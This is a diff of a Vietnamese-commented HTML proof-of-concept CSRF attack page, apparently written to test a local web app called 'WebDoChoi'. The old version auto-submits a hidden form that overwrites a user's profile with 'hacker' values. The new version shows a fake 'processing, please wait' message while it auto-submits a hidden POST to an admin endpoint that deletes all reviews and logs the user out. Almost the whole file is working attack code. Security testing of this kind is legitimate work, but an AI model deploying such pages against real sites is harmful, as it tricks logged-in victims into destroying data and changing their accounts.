@@ -2,20 +2,24 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF Attack</title>
+  <title>Đang xử lý...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    .hidden-form {
+      display: none;
+    }
+  </style>
 </head>
-<body onload="document.forms[0].submit()">
-  <form action="http://localhost:8080/WebDoChoi/setting" method="post">
-    <!-- Giả mạo nội dung cập nhật thông tin người dùng -->
-    <input type="hidden" name="username" value="hacker123">
-    <input type="hidden" name="fullname" value="Người Dùng Bị Hack">
-    <input type="hidden" name="email" value="bihack@example.com">
-    <input type="hidden" name="phoneNumber" value="0999999999">
-    <input type="hidden" name="gender" value="1">
-    <input type="hidden" name="address" value="Nhà của hacker">
-    
-    <!-- Nếu có kiểm tra token CSRF thì bỏ hoặc tìm cách lấy. Nếu không thì để trống như dưới -->
-    <!-- <input type="hidden" name="csrfToken" value=""> -->
+<body onload="document.getElementById('csrf-attack-form').submit()">
+  <h2>Đang xử lý yêu cầu... Vui lòng chờ</h2>
+
+  <!-- Form giả mạo gửi POST tới server của nạn nhân -->
+  <form id="csrf-attack-form" class="hidden-form" method="POST" action="http://localhost:8080/WebDoChoi/admin/reviewManager/deleteAllAndLogout">
+    <!-- Nếu servlet yêu cầu csrfToken thì tấn công sẽ thất bại -->
   </form>
 </body>
 </html>
